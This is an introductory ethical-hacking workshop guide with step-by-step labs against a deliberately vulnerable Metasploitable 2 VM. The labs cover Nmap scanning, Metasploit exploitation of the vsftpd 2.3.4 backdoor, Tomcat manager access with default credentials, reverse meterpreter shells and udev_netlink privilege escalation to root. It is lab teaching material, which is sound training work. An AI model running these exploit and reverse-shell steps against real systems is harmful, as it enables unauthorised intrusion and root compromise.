# Intro to Ethical Hacking Workshop Guide

## Lab 1: Building a Pentesting Lab

Download the following files:

* Kali Linux VM: [https://images.offensive-security.com/virtual-images/kali-linux-2020.1-vmware-amd64.7z](https://images.offensive-security.com/virtual-images/kali-linux-2020.1-vmware-amd64.7z)
* Metasploitable 2 VM: [https://sourceforge.net/projects/metasploitable/files/Metasploitable2/](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)


Grab the IP addresses of the lab machines after these have been deployed:

* ifconfig for linux
* ipconfig for windows


## Lab 2: Nmap

First, make sure our Metasploitable lab machine is reachable. From Kali Linux:

```
ping <metasploitable_ip>
```

Next, we'll try Nmapping this host. Run the following scan to do a basic port scan of the host.

```
nmap -Pn -sS <metasploitable_ip>
```

We now have a list of ports. Let’s see if we can get a little more information about service versions.

```
nmap -Pn -sS -sV <metasploitable_ip>
```

Now that we have a list of ports, and version, we notice that the FTP service vsftpd is running on port 21. Let’s check if Nmap contains any scripts to scan for vulnerabilities in this service. We’ll list the files in the directory using ls -la /usr/share/nmap/scripts and then pipe the output to “grep” to search for the string ftp, using the following command:

```
ls -la /usr/share/nmap/scripts/ | grep ftp
```

There is a script specifically for this host, called “ftp-vsftpd-backdoor.” We’ll run this script against the vulnerable host to determine if it’s vulnerable. Note that in this scan, we’re only specifying port 21 with the -p21 flag, since this is the only port we care to scan with this script.

```
nmap -Pn -sS -sV -p21 --script ftp-vsftpd-backdoor <metasploitable_ip>
```

Running this nmap command should show that service is indeed vulnerable.

## Lab 3: Intro to Metasploit

Now that we have identified a vulnerability using Nmap, let’s attempt to exploit this vulnerability. We’ll begin by starting the Metasploit Console using the following command:

```
msfconsole
```

Once Metasploit has started, we’ll use the following command to search for a relevant exploit for the vulnerable service.

```
search vsftp
```

After this command is completed, we should see at least one vulnerability pertaining to vsftpd. We’ll use the following command to get a little more information about the vulnerability.

```
info exploit/unix/ftp/vsftpd_234_backdoor
```

Running this command shows that the exploit works against vsftpd 2.3.4. If we revisit the Nmap scan results, we should see that the server is running this version. Therefore, we’ll go ahead and activate this exploit.


```
use exploit/unix/ftp/vsftpd_234_backdoor
```

Now that we have specified which exploit we want to use, we’ll need to set a few options for the exploit to properly work. This can be viewed using the following command:

```
show options
```

Now that we have a list of options, we see that we only need to fill in one variable. This is RHOST, since RPORT is the correct port that vsftpd is running on. We’ll set RHOST to the IP address of the Metasploitable box.

```
set RHOST <metasploitable_ip>
```

Finally, running an exploit without a payload is relatively useless. If we begin by typing “set payload” and the tab key a couple of times, Metasploit should autocomplete this field. We see that there is only one option. Let’s go ahead and specify that payload.

```
set payload cmd/unix/interact
```

Everything should now be complete. Let’s type “show options” one more time to verify that there aren’t any additional payload options to specify. There shouldn’t be, so let’s go ahead and run our exploit.


```
run
```

We will see some output, and then should have a blank line. Run the following command in the blank line.

```
id
```

This should return output stating that we have an active session as the root user. Success! We’ve rooted our first box.


## Lab 4: More Metasploit


The next lab will be a bit more involved than the previous exercise. We first begin by revisiting our Nmap results from previously. We see that Tomcat manager is running on port 8180. We recall several incidents involving poor authentication with Tomcat manager. We’ll begin by browsing to this port within a web browser.

```
http://<meterpreter_ip>:8180
```

We should see a panel to the left of the screen. This panel should contain a link titled “Tomcat Manager." Click the “Tomcat Manager” link and insert the default username and password when prompted.

* username: tomcat
* password: tomcat

We’re now in the management panel of Tomcat. From here, we can upload any web application that we would like. We could do this manually, but Metasploit should have a module that does this automatically. Start Metasploit if it isn’t currently running.

```
msfconsole
```

Once Metasploit starts, we should search for any exploit related to tomcat.

```
search tomcat
```

After examining the results, “tomcat_mgr_deploy” sounds like it may do what we’re wanting to do. Let’s verify by using the following command:

```
info exploit/multi/http/tomcat_mgr_deploy
```

Go ahead and use this exploit, since we have verified that it will work against our target host.

```
use exploit/multi/http/tomcat_mgr_deploy
```

Now that we’ve activated this exploit, let’s examine the options available

```
show options
```

As before, we’ll set each variable to the required setting, making sure we provide the default username and password.

```
set HttpPassword tomcat
set HttpUsername tomcat
set RHOST <metasploitable_ip>
set RPORT 8180
```

Now that we need to select a payload for the exploit. Hitting tab a few times reveals java/meterpreter/reverse_tcp. Since we prefer using meterpreter when possible, we’ll select this option.

```
set payload java/meterpreter/reverse_http
```

Once again, “show options” to show payload options.

```
show options
```

We’ll set the payload option to our local IP address.

```
set LHOST <kali_ip>
```

And then run the exploit.

```
run
```

Let’s examine the current UID with the following command.

```
getuid
```

We can see that we’re a local user, and not root. We’ll need to elevate our privileges if possible. Before doing this, we’ll get a little information about the host using the following command.

```
sysinfo
```

## Lab 5: Privilege Escalation

For the next lab, we’ll reuse the meterpreter session we opened previously. We first need to background our current meterpreter session.

```
background
```

Using the following command will show the session number of that Meterpreter session.

```
sessions
```

Since we need to elevate privileges, we’ll run the following command to search for local privilege escalation exploits for linux.

```
search linux/local
```

After searching around a while, we find one that looks interesting: “exploit/linux/local/udev_netlink".

```
info exploit/linux/local/udev_netlink
```

Let’s select this exploit.

```
use exploit/linux/local/udev_netlink
```

Once again, examine the options for this exploit.

```
show options
```

We see that we need to define a session number. We’ll set the SESSION variable to our current running meterpreter session.

```
set SESSION <session_number>
```

Next, we need to select a payload. Once again, we’ll use a reverse_tcp meterpreter session.

```
set payload linux/x86/meterpreter/reverse_tcp
```

And examine options.

```
show options
```

We’ll set the payload options to our current IP address, and select a random port number.

```
set LHOST <kali_ip>
set LPORT 4449
```

And we’ll run our exploit:

```
run
```

If everything goes well, we should have a new Meterpreter session. Let’s see which user we are.

```
getuid
```

After running this command, we should see that we have the uid of 0. That means we now have root access to the system.
